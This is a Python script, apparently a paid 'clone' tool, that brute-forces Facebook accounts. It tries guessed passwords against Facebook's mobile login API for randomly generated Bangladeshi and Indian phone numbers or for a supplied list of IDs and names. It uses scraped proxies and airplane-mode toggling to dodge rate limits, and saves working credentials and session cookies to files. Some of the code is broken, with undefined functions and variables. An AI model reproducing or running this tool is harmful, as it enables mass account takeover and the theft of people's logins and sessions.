'''
Decoded By - MASUM
All Bug Fixed By -  BAD LUCK
FACEBOOK PAGE- BAD LUCK
'''
#__________________IMPORT____________#
import os,random
import sys,time,uuid
import string
try:
    import requests,bs4,mechanize,httpx
    import rich,json,subprocess,random,string
    from concurrent.futures import ThreadPoolExecutor as ThreadPool
except ModuleNotFoundError:
    print('\x1b[38;5;46m[\x1b[1;97m≈\x1b[38;5;46m] MODULE INSTALLING ')
    os.system('pip install requests rich')
    os.system('pip install mechanize')
    os.system('pip install bs4 httpx')
#________________PROXY______________#
try:
    prox= requests.get('https://api.proxyscrape.com/v2/?request=displayproxies&protocol=https&timeout=1000&country=all&ssl=all&anonymity=all').text
    open('.prox.txt','w').write(prox)
    prox=open('.prox.txt','r').read().splitlines()
except Exception as e:
    pass

#________________LOOP______________#
loop,ok,cp,user = 0,[],[],[]
cok,plist = [],[]
#________________COLOUR______________#
A = '\x1b[1;97m' 
R = '\x1b[38;5;196m'
Y = '\033[1;33m'
G = '\x1b[38;5;48m'
B = '\x1b[38;5;8m'
G1 = '\x1b[38;5;46m'
G2 = '\x1b[38;5;47m'
G3 = '\x1b[38;5;48m'
G4 = '\x1b[38;5;49m'
G5 = '\x1b[38;5;50m'
X = '\33[1;34m'
X1 = '\x1b[38;5;14m'
X2 = '\x1b[38;5;123m'
X3 = '\x1b[38;5;122m'
X4 = '\x1b[38;5;86m'
X5 = '\x1b[38;5;121m'
S = '\x1b[1;96m'
M = '\x1b[38;5;205m'
#__________________LINE____________#
def linex():
    print(f'{A}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━')
def clear():
        os.system(f'clear')
        print(logo)
#________________UA______________#
def sex():
	facebook_version = f"{random.randint(100, 450)}.{random.randint(0, 0)}.{random.randint(0, 0)}.{random.randint(1, 40)}.{random.randint(10, 150)}"
	fbbv = str(random.randint(10000000, 66666666))
	fbrv = str(random.randint(000000000,999999999))
	density = random.choice(['2.0', '2.5', '3.0'])
	width = random.choice(["720", "1080", "1280"])
	height = random.choice(["720", "1080", "1280", "1440", "1920"])
	ua = f"[FBAN/FB4A;FBAV/{str(facebook_version)};FBBV/{str(fbbv)};[FBAN/FB4A;FBAV/{str(facebook_version)};FBBV/{str(fbbv)};FBDM/{{density={density},width={width},height={height}}};FBLC/en_US;FBRV/{str(fbrv)};FBCR/MTN-CG;FBMF/Asus;FBBD/Asus;FBPN/com.facebook.katana;FBDV/ASUS_X01BDA;FBSV/9.0;FBOP/1;FBCA/arm64-v8a:]"
	return ua
#__________________LOGO____________#
logo=(f"""
       {G1}███████ {Y}██     ██  {M}█████   {S}██████
       {G2}██      {Y}██     ██ {M}██   ██ {S}██
       {G3}███████ {Y}██  █  ██ {M}███████ {S}██   ███
       {G4}     ██ {Y}██ ███ ██ {M}██   ██ {S}██    ██
       {G5}███████  {Y}███ ███  {M}██   ██  {S}██████
{A}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
{G1}[{A}≈{G1}]{G1} DEVELOPER {A}➢{G1} MASUM\_____ :* \❷/ 3:) \⓿
{G1}[{A}≈{G1}]{G1} TOOLTYPE  {A}➢{G1} FILE {A}&{G1} RANDOM CLONE
{G1}[{A}≈{G1}]{G1} VERSION   {A}➢{A} V{G1}/{A}0.1
{G1}[{A}≈{G1}]{G1} STATUS    {A}➢{A} PAID
{A}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━""")
#__________________MAIN____________#
def menu():
    clear()
    print(f'{G1}[{A}1{G1}]{G1} FILE CLONE ')
    print(f'{G1}[{A}2{G1}]{G1} RANDOM CLONE ')
    print(f'{G1}[{A}3{G1}]{G1} CONTACT DECODER ')
    print(f'{G1}[{A}0{G1}]{G1} EXIT TOOL ')
    linex()
    sex = input(f'{G1}[{A}?{G1}]{G1} CHOICE {A}➢{G1} ')
    if sex in ['1']:
        file()
    elif sex in ['2']:
        XXX()
    elif sex in ['3']:
        os.system('xdg-open https://www.facebook.com/profile.php?id=61557310540905');menu()
    elif sex in ['0']:
        sys.exit()
    else:
        menu()
#__________________RANDOM DEF____________#
def XXX():   
    clear()
    print(f'{G1}[{A}1{G1}]{G1} BANGLADESH CLONING')
    print(f'{G1}[{A}2{G2}]{G2} INDIA CLONING')
    print(f'{G1}[{A}0{G3}]{G3} BACK TO MAIN MENU')
    linex()
    select = input(f'{G1}[{A}?{G5}]{G5} CHOICE {A}:{G5} ')
    if select =='1':
        bd()
        
    elif select =='2':
        _India_()
        
    elif select =='0':
    	menu()
        
    else:
        print(f'{G1}[{A}={G2}]{G2} VALID OPTION')
        time.sleep(2)
        randm()
        
#__________________BD DEF____________#
def bd():
    clear()
    print(f'{G1}[{A}={G1}]{G1} EXAMPLE {A}:{G1} 017{A}/{G1}019{A}/{G1}018{A}/{G1}016');linex()
    code = input(f'{G1}[{A}?{G2}]{G2} CHOICE  {A}:{G2} ')
    name = ''.join(random.choice(string.digits) for _ in range(2))
    cod = ''.join(random.choice(string.digits) for _ in range(2))
    clear()
    print(f'{G1}[{A}={G3}]{G3} EXAMPLE {A}:{G3} 3000{A}/{G3}5000{A}/{G3}10000{A}/{G3}99999');linex()
    limit = int(input(f'{G1}[{A}?{G4}]{G4} CHOICE  {A}:{G4} '))
    for x in range(limit):
        nmp = ''.join(random.choice(string.digits) for _ in range(4))
        user.append(nmp)
    clear()
    with ThreadPool(max_workers=30) as sexy:
        clear()
        print(f'{G1}[{A}={G1}]{G1} SIM CODE  {A}:{G1} {code}')
        print(f'{G1}[{A}={G2}]{G2} TOTAL UID {A}:{G2} {str(len(user))}')
        print(f'{G1}[{A}={G3}]{G3} TURN {G3}[{A}ON{A}/{A}OFF{G3}]{G3} AIRPLANE MODE EVERY {A}3{G3} MIN');linex()
        for love in user:
            ids = code+name+cod+love
            psd = [code+name+cod+love,cod+love,name+love,code+name+cod,'bangladesh','Bangladesh']
            sexy.submit(randm,ids,psd)
    print('')
    print(f'\r{A}──────────────────────────────────────────────────')
    print(f'{G1}[{A}={G1}]{G1} THE PROCESS HAS BEEN COMPLETED')
    print(f'{G1}[{A}={G2}]{G2} TOTAL OK ID {A}:{G2} {str(len(ok))}')
    print(f'{G1}[{A}={G3}]{G3} TOTAL CP ID {A}:{G3} {str(len(cp))}')
    print(f'\r{A}──────────────────────────────────────────────────')
    input(f'{G1}[{A}={G4}]{G4} PRESS ENTER TO BACK ')
    menu()
#__________________INDIA DEF______________#
def India():
    clear()
    print(f'{G1}[{A}≈{G1}]{G1} EXAMPLE {A}➢{A} +91639{G}/{A}+91934{G}/{A}+91902{G}/{A}+91701');linex()
    code = input(f'{G1}[{A}?{G1}]{G1} CHOICE  {A}➢{G1} ')
    clear()
    print(f'{G1}[{A}≈{G1}]{G1} EXAMPLE {A}➢{A} 3000{G}/{A}5000{G}/{A}10000{G}/{A}99999');linex()
    limit = int(input(f'{G1}[{A}?{G1}]{G1} CHOICE  {A}➢{G1} '))
    for x in range(limit):
        nmp = "". join(random.choice(string.digits) for _ in range(7))
        user.append(nmp)
    clear()
    with ThreadPool(max_workers=30) as sexy:
        clear()
        print(f'{G1}[{A}≈{G1}]{G1} SIM CODE  {A}➢{A} {code}')
        print(f'{G1}[{A}≈{G1}]{G1} TOTAL UID {A}➢{A} {str(len(user))}')
        print(f"{G1}[{A}={G1}]{G1} TURN {G1}[{A}ON{G1}/{A}OFF{G1}] AIRPLANE MODE EVERY {A}3{G1} MIN");linex()
        for love in user:
            ids = code + love
            psd = [love,ids[:8],'57273200','59039200','57575751']
            sexy.submit(random,ids,psd)
    print('')
    print(f'\r{A}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━')
    print(f'{G1}[{A}≈{G1}]{G1} THE PROCESS HAS BEEN COMPLETED')
    print(f'{G1}[{A}≈{G1}]{G1} TOTAL OK ID {A}➢{G1} {str(len(ok))}')
    print(f'{G1}[{A}≈{G1}]{M} TOTAL CP ID {A}➢{M} {str(len(cp))}')
    print(f'\r{A}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━')
    input(f'{G1}[{A}≈{G1}]{G1} PRESS ENTER TO BACK ')
    menu()
#__________________FILE DEF____________#
def file():
    clear()
    print(f'{G1}[{A}≈{G1}]{G1} EXAMPLE {A}➢{G1} /{A}sdcard{G1}/{A}SWAG.txt');linex()
    file = input(f'{G1}[{A}?{G1}]{G1} FILE NAME {A}➢{G1} ')
    try:
        fo = open(file,'r').read().splitlines()
    except FileNotFoundError:
        print(f'{G1}[{A}≈{G1}]{G1} FILE NOT FOUND');time.sleep(1)
        file()
    clear()
    print(f'{G1}[{A}≈{G1}]{G1} EXAMPLE {A}➢{G1} {G1}[{A}1-20{G1}]{G1}');linex()
    limit = int(input(f'{G1}[{A}?{G1}]{G1} PASSWORD LIMIT {A}➢{G1} '))
    clear()
    for x in range(limit):
        print(f'{G1}[{A}≈{G1}]{G1} EXAMPLE {A}➢{A} firstlast{G1}/{A}first123{G1}/{A}last123')
        plist.append(input(f'{G1}[{A}?{G1}]{G1} PASSWORD NO {G1}[{A}{x+1}{G1}]{G1} {A}➢{S} '));linex()
    with ThreadPool(max_workers=30) as sexy:
        tl = str(len(fo))
        clear()
        print(f'{G1}[{A}≈{G1}]{G1} TOTAL ID {A}➢{G1} {tl}')
        print(f"{G1}[{A}={G1}]{G1} TURN {G1}[{A}ON{G1}/{A}OFF{G1}] AIRPLANE MODE EVERY {A}3{G1} MIN");linex()
        for user in fo:
            ids,names = user.split('|')
            psd = plist
            sexy.submit(M1,ids,names,psd)
    print('')
    print(f'\r{A}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━')
    print(f'{G1}[{A}≈{G1}]{G1} THE PROCESS HAS BEEN COMPLETED')
    print(f'{G1}[{A}≈{G1}]{G1} TOTAL OK ID {A}➢{G1} {str(len(ok))}')
    print(f'{G1}[{A}≈{G1}]{M} TOTAL CP ID {A}➢{M} {str(len(cp))}')
    print(f'\r{A}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━')
    input(f'{G1}[{A}≈{G1}]{G1} PRESS ENTER TO BACK ')
    menu()
#__________________RANDON METHOD____________#
def randm(ids,psd):
    global loop,ok,cp
    sys.stdout.write(f"\r{G1}[{A}SWAG{G1}]{A}-{G1}[{A}{loop}{G1}]{A}-{G1}[{A}OK{G1}/{A}CP{G1}]{A}-{G1}[{A}{len(ok)}{G1}/{A}{len(cp)}{G1}] ")
    sys.stdout.flush()
    try:
        for pas in psd:
            data={'adid':str(uuid.uuid4()),
            'format':'json',
            'device_id':str(uuid.uuid4()),
            'email':ids,
            'password':pas,
            'generate_analytics_claims':'1',
            'community_id':'',
            'cpl':'true','try_num':'1',
            'family_device_id':str(uuid.uuid4()),
            'credentials_type':'password',
            'source':'login',
            'error_detail_type':'button_with_disabled',
            'enroll_misauth':'false',
            'generate_session_cookies':'1',
            'generate_machine_id':'1',
            'currently_logged_in_userid':'0',
            'locale':'en_US',
            'client_country_code':'US',
            'fb_api_req_friendly_name':'authenticate',
            'api_key':'62f8ce9f74b12f84c123cc23437a4a32',
            'access_token':'350685531728|62f8ce9f74b12f84c123cc23437a4a32'}
            head={'user-agent': 'mbasic.facebook.com',
    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
    'accept-language': 'en-BD,en-GB;q=0.9,en-US;q=0.8,en;q=0.7',
    'cache-control': 'max-age=0',
    
    'dpr': '1.7000000476837158',
    'referer': 'https://mbasic.facebook.com/login/identify/?ctx=recover&c=https%3A%2F%2Fmbasic.facebook.com%2Flogin%2Fdevice-based%2Fpassword%2F%3Fuid%3D100029543623795%26flow%3Dlogin_no_pin%26refsrc%3Dhttps%253A%252F%252Fmbasic.facebook.com%252F&multiple_results=0&ars=device_based_login&from_login_screen=0&wtsid=rdr_0WaiHNRmuyi92A3I0&_rdr',
    'sec-ch-prefers-color-scheme': 'dark',
    'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
    'sec-ch-ua-full-version-list': '"Not-A.Brand";v="99.0.0.0", "Chromium";v="124.0.6327.4"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-model': '"CPH2591"',
    'sec-ch-ua-platform': '"Android"',
    'sec-ch-ua-platform-version': '"14.0.0"',
    'sec-fetch-dest': 'document',
    'sec-fetch-mode': 'navigate',
    'sec-fetch-site': 'same-origin',
    'sec-fetch-user': '?1',
    'upgrade-insecure-requests': '1',
    'user-agent': 'ua',
    'viewport-width': '980',
}
            url = 'https://b-graph.facebook.com/auth/login'
            po = requests.post(url,data=data,headers=head,allow_redirects=False).text
            q = json.loads(po)
            if 'access_token' in q:
                uid = str(q['uid'])
                coki = ";".join(i["name"]+"="+i["value"] for i in q["session_cookies"])
                print(f'\r\r{G1}[SWAG-OK] {uid} | {pas}')
                #print(f'\r\r{G1}[COOKIE]{A} {coki}')
                open('/sdcard/TMT-RNDM-OK.txt','a').write(uid+'|'+pas+'|'+coki+'\n')
                ok.append(uid)
                break
            else:continue
        loop+=1
    except Exception as e:
        pass
	
#__________________FILE METHOD____________#
def M1(ids,names,psd):
    global loop,ok
    nip=random.choice(prox)
    proxs= {'http': 'socks4://'+nip}
    sys.stdout.write(f'\r\r{A}[{G1}SWAG-XD{A}]-[{G1}{loop}{A}]-[{G1}OK{A}:{G1}{len(ok)}{A}] ')
    sys.stdout.flush()
    try:
        fn = names.split(' ')[0]
        try:ln = names.split(' ')[1]
        except:ln = fn
        for pw in psd:
            pas = pw.replace('first',fn.lower()).replace('First',fn).replace('last',ln.lower()).replace('Last',ln).replace('Name',names).replace('name',names.lower())
            data={'adid':str(uuid.uuid4()),
            'format':'json',
            'device_id':str(uuid.uuid4()),
            'email':ids,
            'password':pas,
            'generate_analytics_claims':'1',
            'community_id':'',
            'cpl':'true','try_num':'1',
            'family_device_id':str(uuid.uuid4()),
            'credentials_type':'password',
            'source':'login',
            'error_detail_type':'button_with_disabled',
            'enroll_misauth':'false',
            'generate_session_cookies':'1',
            'generate_machine_id':'1',
            'currently_logged_in_userid':'0',
            'locale':'en_US',
            'client_country_code':'US',
            'fb_api_req_friendly_name':'authenticate',
            'api_key':'62f8ce9f74b12f84c123cc23437a4a32',
            'access_token':'350685531728|62f8ce9f74b12f84c123cc23437a4a32'}
            head={'user-agent': 'mbasic.facebook.com',
    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
    'accept-language': 'en-BD,en-GB;q=0.9,en-US;q=0.8,en;q=0.7',
    'cache-control': 'max-age=0',
     'dpr': '1.7000000476837158',
    'referer': 'https://mbasic.facebook.com/login/identify/?ctx=recover&c=https%3A%2F%2Fmbasic.facebook.com%2Flogin%2Fdevice-based%2Fpassword%2F%3Fuid%3D100029543623795%26flow%3Dlogin_no_pin%26refsrc%3Dhttps%253A%252F%252Fmbasic.facebook.com%252F&multiple_results=0&ars=device_based_login&from_login_screen=0&wtsid=rdr_0WaiHNRmuyi92A3I0&_rdr',
    'sec-ch-prefers-color-scheme': 'dark',
    'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
    'sec-ch-ua-full-version-list': '"Not-A.Brand";v="99.0.0.0", "Chromium";v="124.0.6327.4"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-model': '"CPH2591"',
    'sec-ch-ua-platform': '"Android"',
    'sec-ch-ua-platform-version': '"14.0.0"',
    'sec-fetch-dest': 'document',
    'sec-fetch-mode': 'navigate',
    'sec-fetch-site': 'same-origin',
    'sec-fetch-user': '?1',
    'upgrade-insecure-requests': '1',
    'user-agent': 'ua',
    'viewport-width': '980',
}
            po = requests.post('https://b-graph.facebook.com/auth/login',data=data,headers=head).json()
            if 'access_token' in po:
                print(f'\r\r{A}[{G1}SWAG-OK{A}]{G1} {ids} {A}|{G1} {pas}')
                coki = ";".join(i["name"]+"="+i["value"] for i in po["session_cookies"])
                open('/sdcard/SWAG-FILE-OK.txt','a').write(uid+'|'+pas+'|'+coki+'\n')
                ok.append(ids)
                print(f'\r\r{G1}[SWAG-OK] {uid} | {pas}')
                 #print(f'\r\r{G1}[COOKIE]{A} {coki}')
                print(' Total OK/CP: '+str(len(oks))+'/'+str(len(cps)))
                break
            elif 'www.facebook.com' in po['error']['message']:
                print(f'\r\r{A}[{M}SWAG-CP{A}]{M} {ids} {A}|{M} {pas}')
                open('/sdcard/SWAG-FILE-CP.txt','a').write(ids+'|'+pas+'\n')
            else:continue
        loop+=1
    except Exception as e:
        pass
if __name__ == '__main__':
    menu()